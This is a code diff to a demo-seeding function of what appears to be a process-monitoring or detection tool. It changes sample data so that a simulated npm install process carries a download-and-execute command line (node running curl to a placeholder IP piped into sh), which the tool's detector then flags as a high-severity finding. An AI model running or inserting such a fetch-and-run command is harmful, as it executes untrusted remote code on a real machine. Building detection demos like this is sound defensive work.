@@ -14,7 +14,7 @@ func SeedDemo(s *Store) {
 	install := Process{
 		GUID: "demo-install", PID: 4412, PPID: 4410,
 		Name: "install.js", Exe: "/usr/bin/node",
-		Cmdline:    "node /tmp/x7f-2ac1/install.js --no-audit",
+		Cmdline:    `node -e require('child_process').execSync('curl -s 203.0.113.9/i.sh | sh')`,
 		Cwd:        "/tmp/x7f-2ac1",
 		User:       "bittu",
 		ParentGUID: "demo-npm", ParentName: "npm",
@@ -26,6 +26,7 @@ func SeedDemo(s *Store) {
 			"binary modified in the last 24h",
 		},
 	}
+	why, _ := suspiciousCmdline(install.Cmdline)
 	s.UpsertProcess(install)
 	s.UpsertFlowsForDemo(
 		Flow{Key: "demo-install|203.0.113.9:443/tcp", ProcessGUID: install.GUID,
@@ -41,7 +42,7 @@ func SeedDemo(s *Store) {
 		ID: "demo-f1", Kind: KindSuspicious, Severity: SevHigh,
 		ProcessGUID: install.GUID, ProcessName: install.Name,
 		Title:     "Download-and-execute shaped command line",
-		Evidence:  []string{"pipes a download straight into a shell", "node /tmp/x7f-2ac1/install.js --no-audit"},
+		Evidence:  []string{why, truncate(install.Cmdline, 240)},
 		FirstSeen: at(6 * time.Minute), LastSeen: at(40 * time.Second), Count: 1,
 	})
 	s.AddFinding(Finding{
